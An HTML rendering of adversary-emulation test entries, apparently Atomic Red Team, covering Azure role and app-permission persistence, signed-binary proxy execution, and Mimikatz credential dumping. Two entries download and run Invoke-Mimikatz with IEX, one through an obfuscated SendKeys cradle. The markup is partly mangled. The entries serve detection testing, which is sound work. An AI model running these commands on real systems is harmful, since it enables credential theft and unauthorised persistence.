<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Azure AD username', 'type': 'string', 'default': 'jonh@contoso.com'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Azure AD password', 'type': 'string', 'default': 'p4sswd'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c8f4bc29-a151-48da-b3be-4680af56f404</li>
<li><strong>name</strong>: Azure - adding service principal to Azure role in subscription</li>
<li><strong>description</strong>: The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor 
may be interested primarily in highly privileged roles, e.g. Owner, Contributor.
By default, the role Reader is assigned to service principal in this test.</li>
</ul>
<p>New-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.</p>
<p>The account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write 
(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All 
and Microsoft Graph Directory.Read.All permissions.</p>
<p>Detection hint - check Operation Name "Create role assignment" in subscriptions Activity Logs.</p>
<ul>
<li><strong>platforms</strong>: ['iaas:azure']</li>
<li><strong>command</strong>: Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential</li>
</ul>
<p>$sp = Get-AzADServicePrincipal | where-object {$<em>.DisplayName -eq "#{service_principal_name}"}
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$subscription = Get-AzSubscription | where-object {$</em>.Name -eq "#{subscription}"} 
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }</p>
<p>New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name Az.Resources -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzAccount -Credential $Credential -ErrorAction Ignore</p>
</li>
</ul>
<p>$sp = Get-AzADServicePrincipal | where-object {$<em>.DisplayName -eq "#{service_principal_name}"}
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
$subscription = Get-AzSubscription | where-object {$</em>.Name -eq "#{subscription}"} 
if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
if ($role -eq $null) { Write-Warning "Role not found"; exit }</p>
<p>Remove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"</p>
<ul>
<li><strong>mitre_id</strong>: T1098</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Azure AD username', 'type': 'string', 'default': 'jonh@contoso.com'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Azure AD password', 'type': 'string', 'default': 'p4sswd'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 94ea9cc3-81f9-4111-8dde-3fb54f36af4b</li>
<li><strong>name</strong>: Azure AD - adding permission to application</li>
<li><strong>description</strong>: The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.
This technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: "Get-AzureADApplication" instead of "New-AzureADServicePrincipal".
The DirectoryRecommendations.Read.All permissions has been selected as the default.</li>
</ul>
<p>The account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.</p>
<p>Detection hint - check Operation Name "Add app role assignment to service principal" in subscriptions Activity Logs.
You can also take a look at the materials:
https://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/
https://github.com/reprise99/Sentinel-Queries
https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766
https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb</p>
<ul>
<li><strong>platforms</strong>: ['azure-ad']</li>
<li><strong>command</strong>: Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential</li>
</ul>
<p>$aadApplication = New-AzureADApplication -DisplayName "#{application_name}"
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId</p>
<h1>$aadApplication = Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'"</h1>
<h1>Get Service Principal of Microsoft Graph Resource API</h1>
<p>$graphSP = Get-AzureADServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"</p>
<h1>Initialize RequiredResourceAccess for Microsoft Graph Resource API</h1>
<p>$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]</p>
<h1>Set Application Permissions</h1>
<p>$ApplicationPermissions = @('#{application_permission}')</p>
<p>$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = "Role"
$resourceAccess.Id = $reqPermission.Id    </p>
<h1>Add required app permission</h1>
<p>$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host "App permission $permission not found in the Graph Resource API" -ForegroundColor Red
}</p>
<h1>Add required resource accesses</h1>
<p>$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)</p>
<h1>Set permissions in existing Azure AD App</h1>
<p>Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess</p>
<p>$servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$($aadApplication.AppId)'"</p>
<p>New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AzureAD -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential</p>
</li>
</ul>
<p>$aadApplication = @(Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'")
If ($aadApplication.Count -eq 0)
{
  Write-Host "App not found: cannot delete it"
  exit
}
ElseIf ($aadApplication.Count -gt 1)
{
  Write-Host "Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required."
  exit
}
Else
{
  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId
  Write-Host "Successfully deleted app"
}</p>
<ul>
<li><strong>mitre_id</strong>: T1098</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Azure AD username', 'type': 'string', 'default': 'jonh@contoso.com'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Azure AD password', 'type': 'string', 'default': 'p4sswd'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9ebe7901-7edf-45c0-b5c7-8366300919db</li>
<li><strong>name</strong>: Invoke-ATHRemoteFXvGPUDisablementCommand base test</li>
<li><strong>description</strong>: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).</li>
</ul>
<p>One of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as "PowerShell module load-order hijacking" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.</p>
<p>Invoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the "Disable" argument to RemoteFXvGPUDisablement.exe.</p>
<p>The Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.</p>
<p>Reference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1218</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f3132740-55bc-48c4-bcc0-758a459cd027</li>
<li><strong>name</strong>: Mimikatz</li>
<li>
<p><strong>description</strong>: Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: af1800cf-9f9d-4fd1-a709-14b1e6de020d</li>
<li><strong>name</strong>: Mimikatz - Cradlecraft PsSendKeys</li>
<li>
<p><strong>description</strong>: Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',(<a href="[System.Windows.Forms.Screen]::AllScreens">String</a>).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:<em>).Value[0] (Variable </em>).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:<em>).Value.id-ieq$curpid}|ForEach{(Variable </em>).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable <em>).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:</em>).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable <em>).Value)};If(GPS|?{(Item Variable:</em>).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:<em>).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:</em>).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
